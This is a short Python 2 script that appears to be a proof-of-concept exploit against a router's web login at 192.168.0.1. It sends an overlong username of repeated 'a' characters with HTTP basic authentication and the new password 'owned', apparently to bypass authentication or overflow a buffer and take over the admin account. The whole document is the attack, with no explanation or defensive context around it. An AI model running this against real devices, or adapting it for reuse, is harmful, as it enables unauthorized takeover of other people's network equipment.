#!/usr/bin/env python
import urllib2

SERVER_IP_ADDRESS = '192.168.0.1'
USERNAME =
'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
NEW_PASSWORD = 'owned'

auth_handler = urllib2.HTTPBasicAuthHandler()
auth_handler.add_password('LOGIN(default username & password is admin)',
SERVER_IP_ADDRESS, USERNAME, NEW_PASSWORD);
opener = urllib2.build_opener(auth_handler)
urllib2.install_opener(opener)
res = urllib2.urlopen('http://'+SERVER_IP_ADDRESS+'/home/index.shtml')
